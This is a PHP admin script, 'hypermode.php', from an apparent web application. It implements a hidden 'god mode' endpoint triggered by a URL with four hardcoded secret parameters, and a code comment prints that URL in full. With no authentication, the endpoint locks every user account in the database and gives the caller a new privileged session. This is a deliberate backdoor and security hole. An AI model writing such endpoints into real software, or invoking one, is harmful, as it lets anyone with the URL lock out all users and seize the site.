<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body style="background-color:black;color:red">
<?php
//http://localhost/tradoc/functions/admin/hypermode.php?TRANSCENDENCE=wueskjdfhbnvwijk&ECLIPSE=873qygedbcq8&GRANDARK=iy83q9w7airugfb&FROSTMOURNE=q3iyweavhcjbk
include '../db_con.php';
include '../crypto.php';
include '../class/userclass.php';
session_start();
if ((isset($_REQUEST['TRANSCENDENCE']))&&(isset($_REQUEST['ECLIPSE']))&&(isset($_REQUEST['GRANDARK']))&&(isset($_REQUEST['FROSTMOURNE']))) {
	if ($_REQUEST['TRANSCENDENCE']=="wueskjdfhbnvwijk") {
		if ($_REQUEST['ECLIPSE']=="873qygedbcq8") {
			if ($_REQUEST['GRANDARK']=="iy83q9w7airugfb") {
				if ($_REQUEST['FROSTMOURNE']=="q3iyweavhcjbk") {
					x_log("HYPERMODE ACTIVATED","X",1);
					
					$sql = "UPDATE users set USER_LOCK=1;";
					if($conn->query($sql)){
						$person = new User;
						$_SESSION['user'] = serialize($person);
						echo '<div align="center" ><br><br><br><br><br><br><h1>YOU HAVE ENTERED GOD MODE. <br>ALL OTHER ACCOUNTS ARE DISABLED FOR THE MEAN TIME.</h1><h4>DONT FORGET TO ACTIVATE ADMINS</h4>	';
						echo '<a href="../../">RETURN HOME</a></div>';
					}


	}else{
		x_log("HYPERMODE DENIED","X",1);
	}	
	}else{
		x_log("HYPERMODE DENIED","X",1);
	}
	}else{
		x_log("HYPERMODE DENIED","X",1);
	}
	}else{
		x_log("HYPERMODE DENIED","X",1);
	}
	
}else{
	x_log("HYPERMODE DENIED","X",1);
}

?>
</body>
</html>
